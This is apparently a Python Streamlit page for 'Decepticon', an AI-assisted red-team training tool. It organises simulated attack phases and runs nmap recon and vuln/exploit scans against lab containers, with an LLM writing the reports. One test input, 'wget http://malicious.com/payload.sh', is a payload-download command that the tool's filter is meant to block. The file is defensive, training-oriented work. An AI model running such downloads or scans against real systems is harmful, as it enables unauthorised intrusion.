"""
Main Chat Page 
"""

import streamlit as st
import asyncio
import threading
import os
import sys
import time
import requests

try:
    from streamlit.runtime.scriptrunner_utils.exceptions import StopException
except Exception:
    StopException = None

if os.getenv("LANGSMITH_TRACING", "").lower() == "true" and os.getenv(
    "ENABLE_LANGSMITH_IN_STREAMLIT", "false"
).lower() != "true":
    os.environ["LANGSMITH_TRACING"] = "false"
    os.environ["LANGCHAIN_TRACING_V2"] = "false"

# 
sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(__file__))))

# Float utilities
from frontend.web.utils.float import float_init

# 
from frontend.web.components.chat_messages import ChatMessagesComponent
from frontend.web.components.terminal_ui import TerminalUIComponent
from frontend.web.components.sidebar import SidebarComponent
from frontend.web.components.theme_ui import ThemeUIComponent

# 
from frontend.web.core.app_state import get_app_state_manager
from frontend.web.core.executor_manager import get_executor_manager
from frontend.web.core.workflow_handler import get_workflow_handler
from frontend.web.core.terminal_processor import get_terminal_processor

# 
from frontend.web.utils.validation import check_model_required
from frontend.web.utils.constants import (
    AGENT_VULNERABILITY_ASSESSMENT,
    ICON,
    ICON_TEXT,
    COMPANY_LINK,
    AGENTS_INFO,
    AGENT_PLANNER,
    AGENT_RECONNAISSANCE,
    AGENT_INITIAL_ACCESS,
    AGENT_EXECUTION,
    AGENT_PERSISTENCE,
    AGENT_PRIVILEGE_ESCALATION,
    AGENT_DEFENSE_EVASION,
    AGENT_VULNERABILITY_ASSESSMENT,
    AGENT_CYBER_BASICS,
    AGENT_SIMULATION_TEST,
    AGENT_DETERMINISTIC_WORKFLOW,
    AGENT_SUMMARY,
    AGENT_LATERAL_MOVEMENT,
)

from frontend.web.utils.simulation_mode import should_render_simulated_phase, render_simulated_phase
from frontend.web.utils.cyber_basics import render_cyber_basics

# 
from frontend.web.core.chat_replay import ReplayManager

from src.utils.llm.config_manager import get_current_llm

# 
app_state = get_app_state_manager()
executor_manager = get_executor_manager()  
workflow_handler = get_workflow_handler()
terminal_processor = get_terminal_processor()

# UI 
theme_ui = ThemeUIComponent()
chat_messages = ChatMessagesComponent()
terminal_ui = TerminalUIComponent()
sidebar = SidebarComponent()


def main():
    """"""
    
    # Check authentication first
    from frontend.web.utils.auth_utils import check_authentication
    check_authentication()
    
    # 
    try:
        app_state._initialize_session_state()
        app_state._initialize_user_session()
        app_state._initialize_logging()
    except Exception as e:
        st.error(f"앱 상태 초기화 오류: {str(e)}")
        return

    if "cancel_workflow" not in st.session_state:
        st.session_state.cancel_workflow = False
    if "pending_new_chat" not in st.session_state:
        st.session_state.pending_new_chat = False

    if st.session_state.get("pending_new_chat", False) and not st.session_state.get("workflow_running", False):
        st.session_state.pending_new_chat = False
        st.session_state.cancel_workflow = False
        _finalize_new_chat()
    
    # 
    if not check_model_required():
        _show_model_required_message()
        return
    
    #  Float 
    current_theme = "dark" if st.session_state.get('dark_mode', True) else "light"
    theme_ui.apply_theme_css(current_theme)
    theme_ui.render_corner_logo()
    float_init()
    terminal_ui.apply_terminal_css()

    # )
    # st.logo(ICON_TEXT, icon_image=ICON, size="large", link=COMPANY_LINK)
    
    #  (show_page_header )
    st.title(":red[Decepticon]")
    
    # 
    _setup_sidebar()
    
    # 
    replay_manager = ReplayManager()
    if replay_manager.is_replay_mode():
        _handle_replay_mode(replay_manager)
        return
    
    # 
    _display_active_section()


def _display_planner():
    """Display Planner section with threat modeling and attack chain builder"""
    from frontend.web.components.planner_ui import render_planner_ui
    
    st.markdown("## Planner")
    st.caption("Threat modeling and step-by-step attack planning interface")
    st.markdown("---")
    
    render_planner_ui()


def _display_active_section():
    """메인 UI 렌더링"""
    active_section = st.session_state.get("active_section", AGENT_PLANNER)

    if "legacy_user_section" not in st.session_state:
        st.session_state.legacy_user_section = active_section
    
    if active_section == AGENT_PLANNER:
        _display_planner()
        return

    if active_section == AGENT_VULNERABILITY_ASSESSMENT:
        _display_vulnerability_assessment()
        return

    if active_section == AGENT_CYBER_BASICS:
        render_cyber_basics()
        return
    
    if active_section == AGENT_SIMULATION_TEST:
        _display_simulation_test()
        return
    
    if active_section == AGENT_DETERMINISTIC_WORKFLOW:
        _display_deterministic_workflow()
        return

    # Advanced Initial Access UI (replaces simulated page)
    if active_section == AGENT_INITIAL_ACCESS:
        from frontend.web.components.initial_access_ui import render_initial_access_ui
        render_initial_access_ui()
        return
    if active_section == AGENT_RECONNAISSANCE:
        st.markdown(f"## {_format_section_title(active_section)}")
        tagline = _format_section_tagline(active_section)
        if tagline:
            st.caption(tagline)
        
        col1, col2 = st.columns([3, 1])
        with col1:
            target = st.text_input("Target", value=st.session_state.get("initial_access_target", "victim"), key="recon_target")
        with col2:
            st.markdown("<br>", unsafe_allow_html=True)
            if st.button("🚀 Run Recon", type="primary", use_container_width=True):
                _run_recon_nmap(target)
        
        _render_recon_report_section()
        _display_main_interface()
        return

    # Advanced Execution UI
    if active_section == AGENT_EXECUTION:
        from frontend.web.components.execution_ui import render_execution_ui
        render_execution_ui()
        return

    if active_section == AGENT_SUMMARY:
        _display_summary()
        return

    if should_render_simulated_phase(active_section):
        render_simulated_phase(
            active_section,
            title=_format_section_title(active_section),
            tagline=_format_section_tagline(active_section),
        )
        return

    st.markdown(f"## {_format_section_title(active_section)}")
    tagline = _format_section_tagline(active_section)
    if tagline:
        st.caption(tagline)
    _display_main_interface()


def _display_summary():
    """Display Summary section with comprehensive reporting and metrics"""
    from frontend.web.components.summary_ui import render_summary_ui
    
    st.markdown("## Summary")
    st.caption("Comprehensive engagement summary and report generation")
    st.markdown("---")
    
    render_summary_ui()


def _format_section_title(section_id: str) -> str:
    for agent in AGENTS_INFO:
        if agent.get("id") == section_id:
            return f"{agent.get('icon', '')} {agent.get('name', section_id)}".strip()
    return str(section_id)


def _format_section_tagline(section_id: str) -> str:
    section_norm = str(section_id or "").strip().lower()
    if section_norm == AGENT_PLANNER:
        return "Threat modeling and step-by-step plan"
    if section_norm == AGENT_RECONNAISSANCE:
        return "Target discovery and attack surface mapping"
    if section_norm == AGENT_INITIAL_ACCESS:
        return "Choose an entry vector (simulated)"
    if section_norm == AGENT_EXECUTION:
        return "Execute actions on the target (simulated)"
    if section_norm == AGENT_PERSISTENCE:
        return "Maintain access over time (simulated)"
    if section_norm == AGENT_PRIVILEGE_ESCALATION:
        return "Escalate privileges to higher access (simulated)"
    if section_norm == AGENT_LATERAL_MOVEMENT:
        return "Pivot to other systems in the network (simulated)"
    if section_norm == AGENT_DEFENSE_EVASION:
        return "Reduce detection and cover tracks (simulated)"
    if section_norm == AGENT_VULNERABILITY_ASSESSMENT:
        return "Risk-rated findings and remediation notes (simulated)"
    if section_norm == AGENT_CYBER_BASICS:
        return "Beginner-friendly concepts with simple animations"
    if section_norm == AGENT_SIMULATION_TEST:
        return "Interactive testing and verification of simulation mode security controls"
    if section_norm == AGENT_SUMMARY:
        return "Final report, outcomes, and next steps"
    return ""


def _filter_messages_for_section(structured_messages, section_id: str):
    section_norm = str(section_id or "").strip().lower()

    filtered = []
    for message in structured_messages or []:
        message_type = (message.get("type") or "").strip().lower()

        if message_type == "user":
            msg_section = (message.get("section_id") or "").strip().lower()
            if msg_section:
                if msg_section == section_norm:
                    filtered.append(message)
            else:
                legacy_section = str(st.session_state.get("legacy_user_section", AGENT_PLANNER)).strip().lower()
                if legacy_section == section_norm:
                    filtered.append(message)
            continue

        if message_type == "ai":
            agent_id = (message.get("agent_id") or "").strip().lower()
            if agent_id and agent_id == section_norm:
                filtered.append(message)
            continue

        if message_type == "tool":
            if section_norm == AGENT_RECONNAISSANCE:
                filtered.append(message)
            continue

    return filtered


def _display_simulation_test():
    """Display Simulation Mode Security Test UI"""
    # Import the simulation test UI components
    import sys
    import os
    
    # Add pages directory to path
    pages_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))), "pages")
    if pages_dir not in sys.path:
        sys.path.insert(0, pages_dir)
    
    try:
        # Import components from the simulation test file
        from src.utils.simulation_validator import SimulationValidator
        from src.utils.command_filter import CommandFilter
        from config.simulation_config import SIMULATION_MODE, get_info_message
        
        # Display the simulation test UI
        st.markdown("## Simulation Mode Security Test")
        st.markdown("**Interactive Security Validation & Testing Dashboard**")
        st.markdown("---")
        
        # Show simulation mode status
        col1, col2, col3 = st.columns(3)
        
        with col1:
            st.markdown(
                f'<div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 25px; border-radius: 10px; text-align: center; box-shadow: 0 4px 6px rgba(0,0,0,0.1);"><h2>{"ACTIVE" if SIMULATION_MODE else "INACTIVE"}</h2><p>Simulation Mode</p></div>',
                unsafe_allow_html=True
            )
        
        with col2:
            test_categories = 6
            st.markdown(
                f'<div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 25px; border-radius: 10px; text-align: center; box-shadow: 0 4px 6px rgba(0,0,0,0.1);"><h2>{test_categories}</h2><p>Security Checks</p></div>',
                unsafe_allow_html=True
            )
        
        with col3:
            st.markdown(
                '<div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 25px; border-radius: 10px; text-align: center; box-shadow: 0 4px 6px rgba(0,0,0,0.1);"><h2>100%</h2><p>Protection Coverage</p></div>',
                unsafe_allow_html=True
            )
        
        st.markdown("---")
        
        # Tabs for different testing modes
        tab1, tab2, tab3 = st.tabs(["🎯 Quick Tests", "🧪 Custom Testing", "📖 Documentation"])
        
        with tab1:
            st.markdown("### Quick Security Tests")
            st.markdown("Run pre-configured tests to verify simulation mode is working correctly.")
            
            if st.button("🚀 Run All Quick Tests", type="primary", use_container_width=True):
                st.markdown("---")
                
                # Test 1: Private IP
                st.markdown("#### ✅ Test 1: Private IP (Should be ALLOWED)")
                target = "192.168.1.100"
                is_valid, msg = SimulationValidator.is_valid_target(target)
                st.code(f"Target: {target}", language="text")
                if is_valid:
                    st.success(f"✅ PASSED: {msg}")
                else:
                    st.error(f"❌ FAILED: {msg}")
                
                # Test 2: Public IP
                st.markdown("#### ❌ Test 2: Public IP (Should be BLOCKED)")
                target = "8.8.8.8"
                is_valid, msg = SimulationValidator.is_valid_target(target)
                st.code(f"Target: {target}", language="text")
                if not is_valid:
                    st.success(f"✅ PASSED (Correctly Blocked): {msg}")
                else:
                    st.error(f"❌ FAILED (Should be blocked!): {msg}")
                
                # Test 3: Domain
                st.markdown("#### ❌ Test 3: Domain Name (Should be BLOCKED)")
                target = "google.com"
                is_valid, msg = SimulationValidator.is_valid_target(target)
                st.code(f"Target: {target}", language="text")
                if not is_valid:
                    st.success(f"✅ PASSED (Correctly Blocked): {msg}")
                else:
                    st.error(f"❌ FAILED (Should be blocked!): {msg}")
                
                # Test 4: Docker Container
                st.markdown("#### ✅ Test 4: Docker Container (Should be ALLOWED)")
                target = "victim"
                is_valid, msg = SimulationValidator.is_valid_target(target)
                st.code(f"Target: {target}", language="text")
                if is_valid:
                    st.success(f"✅ PASSED: {msg}")
                else:
                    st.error(f"❌ FAILED: {msg}")
                
                # Test 5: Dangerous Command
                st.markdown("#### ❌ Test 5: Dangerous Command (Should be BLOCKED)")
                command = "wget http://malicious.com/payload.sh"
                is_safe, msg = CommandFilter.is_safe_command(command)
                st.code(f"Command: {command}", language="bash")
                if not is_safe:
                    st.success(f"✅ PASSED (Correctly Blocked): {msg}")
                else:
                    st.error(f"❌ FAILED (Should be blocked!): {msg}")
                
                # Test 6: Safe Command
                st.markdown("#### ✅ Test 6: Safe Command (Should be ALLOWED)")
                command = "ls -la"
                is_safe, msg = CommandFilter.is_safe_command(command)
                st.code(f"Command: {command}", language="bash")
                if is_safe:
                    st.success(f"✅ PASSED: {msg}")
                else:
                    st.error(f"❌ FAILED: {msg}")
                
                st.success("✅ All quick tests completed! Review results above.")
            else:
                st.info("👆 Click the button above to run all quick tests")
        
        with tab2:
            st.markdown("### 🧪 Custom Security Testing")
            st.markdown("Test your own targets and commands to see how simulation mode validates them.")
            
            col_a, col_b = st.columns(2)
            
            with col_a:
                st.markdown("#### Test Target Validation")
                custom_target = st.text_input(
                    "Enter target (IP, domain, or container name):",
                    placeholder="e.g., 192.168.1.1, google.com, victim",
                    key="custom_target_test"
                )
                
                if st.button("🔍 Validate Target", type="primary", key="validate_target_btn"):
                    if custom_target:
                        is_valid, msg = SimulationValidator.is_valid_target(custom_target)
                        st.code(f"Target: {custom_target}", language="text")
                        if is_valid:
                            st.success(f"✅ ALLOWED: {msg}")
                        else:
                            st.error(f"❌ BLOCKED: {msg}")
                    else:
                        st.warning("Please enter a target to test")
            
            with col_b:
                st.markdown("#### Test Command Filtering")
                custom_command = st.text_input(
                    "Enter command to test:",
                    placeholder="e.g., nmap -sV 192.168.1.1, wget http://...",
                    key="custom_command_test"
                )
                
                if st.button("🔍 Validate Command", type="primary", key="validate_cmd_btn"):
                    if custom_command:
                        is_safe, msg = CommandFilter.is_safe_command(custom_command)
                        st.code(f"Command: {custom_command}", language="bash")
                        if is_safe:
                            st.success(f"✅ SAFE: {msg}")
                        else:
                            st.error(f"❌ BLOCKED: {msg}")
                    else:
                        st.warning("Please enter a command to test")
        
        with tab3:
            st.markdown("### 📖 Simulation Mode Documentation")
            st.markdown(get_info_message())
            
            st.markdown("---")
            st.markdown("### How It Works")
            st.markdown("""
            **Validation Architecture:**
            
            ```
            User Input
                ↓
            [SimulationValidator.is_valid_target()]
                ↓
            Check: Docker container? → ✅ Allow
            Check: Private IP?       → ✅ Allow
            Check: Public IP?        → ❌ Block
            Check: Domain?           → ❌ Block
                ↓
            [CommandFilter.is_safe_command()]
                ↓
            Check: Exploit keywords? → ❌ Block
            Check: External URLs?    → ❌ Block
            Check: Dangerous patterns? → ❌ Block
                ↓
            Execution (if both pass)
            ```
            """)
        
    except Exception as e:
        st.error(f"Failed to load Simulation Test UI: {e}")
        st.markdown("**Error Details:**")
        st.code(str(e), language="text")


def _display_vulnerability_assessment():
    st.title("🛑 Vulnerability Assessment")
    st.markdown("**Real-time vulnerability scanning against lab targets**")
    
    col1, col2, col3 = st.columns([2, 1, 1])
    
    with col1:
        target = st.text_input("Target", value=st.session_state.get("initial_access_target", "decepticon-victim"), key="vuln_target")
    
    with col2:
        scan_type = st.selectbox("Scan Type", ["Quick", "Standard", "Deep"], index=1)
        
    with col3:
        st.markdown("<br>", unsafe_allow_html=True)
        if st.button("🚀 Run Scan", type="primary", use_container_width=True):
            _run_vuln_scan(target, scan_type)
    
    st.markdown("---")
    
    _render_vuln_results()

def _render_vuln_results():
    vulnerabilities = st.session_state.get("vuln_assessment_items")
    
    if vulnerabilities:
        risk_icon = {"high": "🔴", "medium": "🟡", "low": "🟢"}
        for v in vulnerabilities:
            risk = (v.get("risk") or "").strip()
            risk_key = risk.lower()
            icon = risk_icon.get(risk_key, "⚪")

            with st.expander(f"{icon} {v.get('name', 'Vulnerability')}", expanded=False):
                st.markdown(f"**Attack Phase:** {v.get('phase', '-')}")
                st.markdown(f"**Risk Level:** {icon} {risk}")
                st.markdown(f"**Description:** {v.get('description', '-')}")

    output_text = st.session_state.get("vuln_assessment_output")
    if output_text:
        st.code(output_text, language="text")

def _run_vuln_scan(target: str = "decepticon-victim", scan_type: str = "Standard"):
    api_base = os.getenv("EXEC_API_BASE_URL", "http://127.0.0.1:8000")
    url = f"{api_base.rstrip('/')}/execute/vuln"

    # Map scan type to nmap scripts
    script_map = {
        "Quick": "vuln",
        "Standard": "vuln,exploit",
        "Deep": "vuln,exploit,auth,default"
    }
    scripts = script_map.get(scan_type, "vuln")
    
    terminal_ui.add_command(f"nmap -sV -Pn --script {scripts} -T4 {target}")

    try:
        with st.spinner(f"Running {scan_type} Nmap vulnerability scan on {target}..."):
            resp = requests.post(url, json={"target": target, "scripts": scripts}, timeout=330)
        if resp.status_code != 200:
            terminal_ui.add_output(resp.text)
            st.error(f"Vuln API error ({resp.status_code})")
            return

        payload = resp.json()
        output = payload.get("output") or ""
        terminal_ui.add_output(output)

        st.session_state["vuln_assessment_output"] = output
        
        # Generate structured findings using LLM
        with st.spinner("Analyzing vulnerabilities with AI..."):
            _generate_vuln_report(output)
            
    except Exception as e:
        terminal_ui.add_output(str(e))
        st.error(f"Failed to call vuln API: {e}")

def _generate_vuln_report(raw_output: str):
    llm = get_current_llm()
    if llm is None:
        st.warning("LLM is not available to parse findings. Raw output is shown in terminal.")
        return

    prompt = (
        "You are a security analyst evaluating an Nmap vulnerability scan output.\n"
        "Parse the raw output and return a clean JSON array of findings, without markdown blocks.\n"
        "Each finding must have the following keys: 'name', 'phase' (e.g., Initial Access, Execution), "
        "'risk' (High, Medium, Low), and 'description'. Ensure it is valid JSON.\n\n"
        "RAW OUTPUT:\n" + raw_output
    )

    try:
        resp = llm.invoke(prompt)
        text_resp = getattr(resp, "content", str(resp)).strip()
        
        # Handle markdown blocks if the LLM includes them
        if text_resp.startswith("```json"):
            text_resp = text_resp[7:]
        if text_resp.startswith("```"):
            text_resp = text_resp[3:]
        if text_resp.endswith("```"):
            text_resp = text_resp[:-3]
            
        import json
        parsed = json.loads(text_resp.strip())
        if isinstance(parsed, list):
            st.session_state["vuln_assessment_items"] = parsed
        else:
            st.session_state["vuln_assessment_items"] = [parsed]
            
    except Exception as e:
        st.error("Failed to parse AI response into structured vulnerabilities.")


def _get_default_vulnerabilities():
    return [
        {
            "name": "Outdated Web Framework",
            "phase": "Execution",
            "risk": "High",
            "description": "The target application appears to run an older framework version. In a real engagement, this could expose known RCE or auth bypass vulnerabilities.",
        },
        {
            "name": "Weak Password Policy",
            "phase": "Initial Access",
            "risk": "Medium",
            "description": "Accounts may accept weak passwords. This increases the risk of credential stuffing and brute-force in a real scenario (simulation only).",
        },
        {
            "name": "Over-Privileged Service Account",
            "phase": "Privilege Escalation",
            "risk": "High",
            "description": "A service account is assumed to have broader permissions than required. Over-privilege can enable lateral movement or escalation (education only).",
        },
        {
            "name": "Missing Security Headers",
            "phase": "Defense Evasion",
            "risk": "Low",
            "description": "Common HTTP security headers may be absent. While not always critical alone, it can increase exposure to clickjacking or content sniffing.",
        },
        {
            "name": "Unencrypted Internal Traffic",
            "phase": "Persistence",
            "risk": "Medium",
            "description": "Internal service-to-service traffic is assumed to be plaintext. In reality, this may allow traffic inspection and session hijacking.",
        },
    ]


def _ensure_vuln_assessment_results(source: str = ""):
    if "vuln_assessment_items" not in st.session_state or not st.session_state.get("vuln_assessment_items"):
        st.session_state["vuln_assessment_items"] = _get_default_vulnerabilities()

    if "vuln_assessment_output" not in st.session_state or not st.session_state.get("vuln_assessment_output"):
        st.session_state["vuln_assessment_output"] = (
            "[SIMULATED] Vulnerability assessment complete.\n"
            "- 5 items reviewed\n"
            "- No real scanning performed\n"
            "- Use findings for learning and discussion\n"
        )

    if source:
        st.session_state["vuln_assessment_output"] = (
            "[SIMULATED] Vulnerability assessment complete (based on Recon artifacts).\n"
            "- Recon output reviewed\n"
            "- 5 simulated findings generated\n"
            "- No real scanning performed\n"
        )


def _run_recon_nmap(target: str = "decepticon-victim"):
    api_base = os.getenv("EXEC_API_BASE_URL", "http://127.0.0.1:8000")
    url = f"{api_base.rstrip('/')}/execute/recon"

    terminal_ui.add_command(f"nmap -sV --version-light -Pn --open -T4 {target}")

    try:
        with st.spinner(f"Running nmap in Kali container on {target}..."):
            resp = requests.post(url, json={"target": target}, timeout=330)
        if resp.status_code != 200:
            terminal_ui.add_output(resp.text)
            st.error(f"Recon API error ({resp.status_code})")
            return

        payload = resp.json()
        output = payload.get("output") or ""
        terminal_ui.add_output(output)

        st.session_state["recon_output"] = output
        st.session_state["recon_report"] = _generate_recon_report(output)
        _ensure_vuln_assessment_results(source=output)

    except Exception as e:
        terminal_ui.add_output(str(e))
        st.error(f"Failed to call recon API: {e}")


def _generate_recon_report(raw_output: str) -> str:
    llm = get_current_llm()
    if llm is None:
        return "LLM is not available. Please select a model and ensure API keys are configured."

    prompt = (
        "You are a security analyst. Analyze the following raw Nmap output and produce a Reconnaissance Report with:\n"
        "1) Open ports list\n"
        "2) Services and versions\n"
        "3) High-level risk assessment\n"
        "4) Reconnaissance summary\n"
        "5) Recommendation for next phase (Initial Access - simulated)\n\n"
        "RAW OUTPUT:\n" + raw_output
    )

    try:
        resp = llm.invoke(prompt)
        return getattr(resp, "content", str(resp))
    except Exception as e:
        return (
            "AI analysis is temporarily unavailable.\n\n"
            f"Error: {e}\n\n"
            "You can still use the REAL terminal output above for screenshots. "
            "Retry after fixing model connectivity."
        )


def _render_recon_report_section():
    report = st.session_state.get("recon_report")
    raw_output = st.session_state.get("recon_output")

    if not raw_output:
        return

    st.markdown("## AI Reconnaissance Report")
    if report:
        st.markdown(report)
    else:
        st.info("Recon output captured. Generating report...")

    if st.button("Proceed to Vulnerability Assessment", use_container_width=False):
        st.session_state["pending_active_section"] = AGENT_VULNERABILITY_ASSESSMENT
        st.rerun()

    if st.session_state.get("vuln_assessment_output"):
        st.markdown("## Vulnerability Assessment (Simulated)")
        with st.expander("View simulated findings", expanded=False):
            for v in st.session_state.get("vuln_assessment_items") or _get_default_vulnerabilities():
                risk = (v.get("risk") or "").strip().lower()
                icon = "🔴" if risk == "high" else "🟡" if risk == "medium" else "🟢" if risk == "low" else ""
                st.markdown(f"**{icon} {v.get('name','Vulnerability')}**")
                st.markdown(f"Attack Phase: {v.get('phase','-')}")
                st.markdown(f"Risk Level: {icon} {v.get('risk','-')}")
                st.markdown(v.get("description", "-"))
                st.divider()

        st.code(st.session_state.get("vuln_assessment_output"), language="text")

        if st.button("Open Vulnerability Assessment Tab", use_container_width=False):
            st.session_state["pending_active_section"] = AGENT_VULNERABILITY_ASSESSMENT
            st.rerun()


def _show_model_required_message():
    """"""
    st.warning("⚠️ Please select a model first")
    if st.button("Go to Model Selection", type="primary"):
        st.switch_page("streamlit_app.py")


def _setup_sidebar():
    """"""
    # 
    callbacks = {
        "on_change_model": lambda: st.switch_page("streamlit_app.py"),
        "on_chat_history": lambda: st.switch_page("pages/03_Chat_History.py"),
        "on_new_chat": _create_new_chat,
        "on_debug_mode_change": app_state.set_debug_mode
    }
    
    # 
    try:
        current_model = st.session_state.get('current_model')
        active_agent = st.session_state.get('active_agent')
        completed_agents = st.session_state.get('completed_agents', [])
        session_stats = app_state.get_session_stats()
        debug_info = app_state.get_debug_info()
    except Exception as e:
        st.error(f": {str(e)}")
        # 
        current_model = None
        active_agent = None
        completed_agents = []
        session_stats = {"messages_count": 0, "events_count": 0, "steps_count": 0, "elapsed_time": 0, "active_agent": None, "completed_agents_count": 0}
        debug_info = {"user_id": "Error", "thread_id": "Error", "executor_ready": False, "workflow_running": False}
    
    # 
    sidebar.render_complete_sidebar(
        model_info=current_model,
        active_agent=active_agent,
        completed_agents=completed_agents,
        session_stats=session_stats,
        debug_info=debug_info,
        callbacks=callbacks
    )


def _display_main_interface():
    """ Chat + Floating Terminal"""
    
    # 
    if "terminal_visible" not in st.session_state:
        st.session_state.terminal_visible = True
    
    terminal_processor.initialize_terminal_state()
    
    # Chat UI
    chat_height = app_state.get_env_config().get("chat_height", 700)
    chat_container = st.container(height=chat_height, border=False)
    
    with chat_container:
        messages_area = st.container()
        if not st.session_state.get('workflow_running', False):
            structured_messages = st.session_state.get('structured_messages', [])
            active_section = st.session_state.get("active_section", AGENT_PLANNER)
            visible_messages = _filter_messages_for_section(structured_messages, active_section)
            chat_messages.display_messages(visible_messages, messages_area)
    
    # Floating 
    _handle_terminal_toggle()
    
    # Floating
    _render_floating_terminal()
    
    # 
    _handle_user_input(messages_area)


def _handle_terminal_toggle():
    """"""
    toggle_clicked = terminal_ui.create_floating_toggle_button(st.session_state.terminal_visible)
    
    if toggle_clicked:
        # 
        st.session_state.terminal_visible = not st.session_state.terminal_visible
        
        # 
        st.rerun()


def _render_floating_terminal():
    """"""
    if st.session_state.terminal_visible:
        terminal_history = terminal_processor.get_terminal_history()
        terminal_ui.create_floating_terminal(terminal_history)


def _handle_user_input(messages_area):
    """"""
    
    auto_user_input = st.session_state.pop("auto_user_input", None)
    user_input = auto_user_input or st.chat_input("Type your red team request here...")

    if user_input:
        cmd = user_input.strip().lower()
        if ("vulner" in cmd and "assess" in cmd) or ("vulner" in cmd and "asses" in cmd):
            if "run" in cmd or cmd.startswith("vulner"):
                _ensure_vuln_assessment_results()
                st.session_state["pending_active_section"] = AGENT_VULNERABILITY_ASSESSMENT
                st.rerun()

    if user_input and not st.session_state.get('workflow_running', False):
        
        async def execute_workflow():
            # 
            validation_result = workflow_handler.validate_execution_state()
            if not validation_result["can_execute"]:
                st.error(validation_result.get("error_message") or "Cannot execute workflow")
                return
            
            # 
            user_message = workflow_handler.prepare_user_input(user_input)

            active_section = st.session_state.get("active_section", AGENT_PLANNER)
            user_message["section_id"] = active_section
            
            # 
            with messages_area:
                chat_messages.display_user_message(user_message)
            
            # UI 
            ui_callbacks = {
                "on_message_ready": lambda msg: _display_message_callback(msg, messages_area),
                "on_terminal_message": _terminal_message_callback,
                "on_workflow_complete": lambda: None,
                "on_error": lambda error: st.error(f"Workflow error: {error}")
            }
            
            # UI 
            result = await workflow_handler.execute_workflow_logic(
                user_input, ui_callbacks, terminal_ui
            )
            
            # 
            if result["success"]:
                # 
                # rerun 
                # st.rerun()
                pass
            else:
                if result["error_message"]:
                    st.error(result["error_message"])

        def _run_async_safely(coro):
            try:
                return asyncio.run(coro)
            except BaseException as e:
                if StopException is not None and isinstance(e, StopException):
                    return None
                raise

        _run_async_safely(execute_workflow())

        if st.session_state.get("pending_new_chat", False) and not st.session_state.get(
            "workflow_running", False
        ):
            st.session_state.pending_new_chat = False
            st.session_state.cancel_workflow = False
            _finalize_new_chat()


def _display_message_callback(message, messages_area):
    """"""
    message_type = message.get("type", "")

    active_section = st.session_state.get("active_section", AGENT_PLANNER)
    active_section_norm = str(active_section).strip().lower()

    if message_type == "ai":
        agent_id = (message.get("agent_id") or "").strip().lower()
        if agent_id and agent_id != active_section_norm:
            return
    elif message_type == "tool":
        if active_section_norm != AGENT_RECONNAISSANCE:
            return

    with messages_area:
        if message_type == "ai":
            chat_messages.display_agent_message(message, streaming=False)
        elif message_type == "tool":
            chat_messages.display_tool_message(message)


def _terminal_message_callback(tool_name, content):
    """"""
    # 
    pass


def _create_new_chat():
    """"""
    try:
        if st.session_state.get("workflow_running", False):
            st.session_state.cancel_workflow = True
            st.session_state.pending_new_chat = True
            st.warning("Cancelling current workflow… starting new chat shortly.")
            return

        _finalize_new_chat()

    except Exception as e:
        st.error(f"Failed to create new chat: {str(e)}")


def _finalize_new_chat():
    conversation_id = app_state.create_new_conversation()
    executor_manager.reset()
    
    # 
    current_model = st.session_state.get('current_model')
    if current_model:
        async def reinitialize():
            await executor_manager.initialize_with_model(current_model)
        asyncio.run(reinitialize())
    
    # 
    terminal_processor.clear_terminal_state()
    
    st.success("✨ New chat session started!")
    # rerun 
    # st.rerun()


def _handle_replay_mode(replay_manager):
    """- ReplayManager """
    # 
    
    # Float 
    float_init()
    terminal_ui.apply_terminal_css()
    
    # 
    if "terminal_visible" not in st.session_state:
        st.session_state.terminal_visible = True
    
    terminal_processor.initialize_terminal_state()
    
    # Chat UI
    chat_height = app_state.get_env_config().get("chat_height", 700)
    chat_container = st.container(height=chat_height, border=False)
    
    with chat_container:
        messages_area = st.container()
        
        # ReplayManager를 사용하여 재현 처리
        replay_handled = replay_manager.handle_replay_in_main_app(
            messages_area, st.sidebar.container(), chat_messages, terminal_ui
        )
        
        if not replay_handled:
            # 
            st.error(".")
    
    # Floating 
    _handle_terminal_toggle()
    
    # Floating 
    _render_floating_terminal()
    
    # 
    if st.session_state.get("replay_completed", False):
        st.markdown("<br>", unsafe_allow_html=True)
        col1, col2, col3 = st.columns([1, 2, 1])
        with col2:
            if st.button("✨ Start New Chat", use_container_width=True, type="primary"):
                # 
                for key in ["replay_mode", "replay_session_id", "replay_completed"]:
                    st.session_state.pop(key, None)
                #  rerun 
                _create_new_chat()
                # st.rerun() 

def _display_deterministic_workflow():
    """Display Deterministic Workflow Engine interface"""
    from frontend.web.components.deterministic_workflow_ui import _display_deterministic_workflow as render_workflow_ui
    render_workflow_ui()


if __name__ == "__main__":
    main()
